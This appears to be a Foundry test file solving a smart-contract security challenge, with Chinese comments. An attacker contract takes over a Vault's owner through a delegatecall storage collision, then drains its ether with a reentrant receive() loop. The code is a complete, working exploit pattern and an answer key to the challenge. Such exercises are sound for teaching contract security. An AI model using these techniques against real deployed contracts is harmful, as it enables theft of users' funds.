// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";


contract AttackVault {
  Vault public vault;
  bytes32 public logicAddress;
  
  constructor(address _vaultAddress, bytes32 _logicAddress) payable {
    vault = Vault(payable(_vaultAddress));
    logicAddress = _logicAddress;
  }

  // 攻击者改变 Vault 合约的 owner 为攻击者自己
  function attack() external {
    // 调用 Vault 合约的 changeOwner 函数, 利用 delegatecall 漏洞修改 Vault 合约的 owner
    bytes memory data = abi.encodeWithSignature("changeOwner(bytes32,address)", logicAddress, address(this));
    (bool success,) = address(vault).call(data);
    require(success, "changeOwner failed");
  }

  function attackWithdraw() external payable {
    // 存入一些ETH触发 receive 函数
    vault.deposite{value: 1 ether}();
    // 打开提现
    vault.openWithdraw();
    // 发起提款触发 receive 函数
    vault.withdraw();

  }

  receive() external payable {
    // 如果合约有余额，则提现
    if (address(vault).balance > 0 ) {
      vault.withdraw();
    }
  }

}


contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 1 ether}();
        
        vm.stopPrank();

    }

    function testExploit() public {
        // 给 Vault 合约和攻击者合约都存入1 ether
        // vm.deal(address(vault), 1 ether);
        vm.deal(palyer, 1 ether);

        // 攻击者开始操作
        vm.startPrank(palyer);

        // add your hacker code.
        // 创建攻击合约
        /**
            AttackVault
            ├── 第一步: attack()
            │   └── 利用 delegatecall 漏洞修改 owner
            │
            └── 第二步: attackWithdraw()
                ├── deposite(): 存入 1 ETH
                ├── openWithdraw(): 开启提现
                └── withdraw(): 触发重入攻击
                    └── receive(): 重入逻辑
         */
        AttackVault attack = new AttackVault(address(vault), bytes32(uint256(uint160(address(logic)))));
        // 给攻击合约存入1 ether
        vm.deal(address(attack), 1 ether);
        // 攻击者改变 Vault 合约的 owner 为攻击者自己
        attack.attack();
        // 验证 Vault 合约的 owner 是否为攻击者
        assertEq(address(vault.owner()), address(attack));
        // 攻击者提现
        attack.attackWithdraw();
        // 验证 Vault 合约的余额是否为0
        assertEq(address(vault).balance, 0);

        console.log("vault balance: ", address(vault).balance);
        console.log("attack balance: ", address(attack).balance);
        console.log("logic balance: ", address(logic).balance);
        console.log("owner balance: ", address(owner).balance);
        console.log("palyer balance: ", address(palyer).balance);


        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}